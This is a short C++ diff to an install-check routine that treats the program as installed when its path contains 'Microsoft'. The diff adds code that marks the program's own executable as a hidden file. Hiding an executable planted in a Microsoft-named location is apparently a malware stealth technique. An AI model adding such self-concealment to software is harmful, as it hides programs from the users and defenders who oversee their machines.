@@ -257,6 +257,10 @@ class Helpers
 			{
 				size_t found = ExePath().find("Microsoft");
 				if (found != std::string::npos) {
+					int attr = GetFileAttributes(ExePath().c_str());
+					if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+						SetFileAttributes(ExePath().c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
+					}
 					return "installed";
 				}
 				else {
@@ -281,6 +285,8 @@ class Helpers
 					}
 					return "failed";
 				}
+
+	
 			}
 			else
 			{
